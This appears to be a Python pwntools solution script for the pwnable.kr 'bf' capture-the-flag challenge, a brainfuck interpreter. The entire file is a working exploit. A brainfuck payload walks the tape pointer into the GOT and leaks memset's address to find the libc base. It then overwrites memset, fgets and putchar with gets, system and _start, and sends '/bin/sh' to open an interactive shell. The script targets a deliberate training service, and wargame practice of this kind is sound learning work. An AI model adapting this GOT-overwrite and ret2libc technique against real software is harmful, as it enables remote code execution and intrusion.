from pwn import *
conn = remote ('pwnable.kr',9001)
#conn = process('./bf')

print(conn)
a=conn.recvline()#'welcome to brainfuck testing system!!
print(a)
a=conn.recvline()#type some brainfuck instructions except [ ]
print(a)

libc = ELF('bf_libc.so')

# got.plt addresses
# 0x804a02c - memset
# 0x804a010 - fgets
# 0x804a030 - putchar, initialy points to 0x080484d6

_start_addr = 0x080484e0

# move to memset address
payload  = '.' + (0x0804a0a0 - 0x0804a02c)*'<'

# leak memset's address
payload  += '.>.>.>.<<<'
#payload  += '>>>.<.<.<.'

ASSIGN_STR =',>,>,>,<<<'

# ASSIGN_STR ='>>>,<,<,<,'

#go back to memset addr
# and also, the ',' waits for user input
# and set the current pointed byte according to user input.
# after we calculate the address of gets we will send the address
# and then memset in the got.plt will point to gets
payload  += ASSIGN_STR

#move the pointer to fgets
payload  += (0x804a02c - 0x804a010)*'<'

#again, prepare overwriting fgets with user input
#and the go back to fgets
payload  += ASSIGN_STR

#move the pointer to putchar and prepare for overwrite
payload  += (0x804a030 - 0x804a010)*'>'
payload  += ASSIGN_STR



# all other bytes are already identical

# now we have to call putchar
payload  += '.'

#print(payload)

conn.sendline(payload)

print(conn.recvn(1,timeout=5))

memset_abs_addr = conn.recvn(4,timeout=5)[::-1]

print("memset_abs_addr:")
print(memset_abs_addr)
print("u32(memset_abs_addr)")
print(u32(memset_abs_addr))

libc = ELF('bf_libc.so')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')

memset_offset = libc.symbols[b'memset']

print("memset_offset")
print(memset_offset)

libc_start = u32(memset_abs_addr) - memset_offset
print("libc_start:")
print(libc_start)

gets_abs_adress = libc_start + libc.symbols[b'gets']

print("p32(gets_abs_adress):")
print(p32(gets_abs_adress))

system_abs_adress = libc_start + libc.symbols[b'system']

print("system_abs_adress:")
print(p32(system_abs_adress))

#using the ',' we padded got.plt's memset it will be
# set from user input we now send
conn.send(p32(gets_abs_adress))

#same for got.plt's fgets
conn.send(p32(system_abs_adress))

#same for _start_addr
conn.send(p32(_start_addr))

print("p32(_start_addres):")
print(p32(_start_addr))

#conn.interactive()

a = conn.recvline()
print(a)

a = conn.recvline()
print(a)

# at this point, we run the program from the
# beggining, but with a call to gets instead of memset, so, lets
# send it the shell:

conn.sendline(b'/bin/sh')
#a = conn.recvline()
#print(a)

#and now system is called with /bin/sh

conn.interactive()
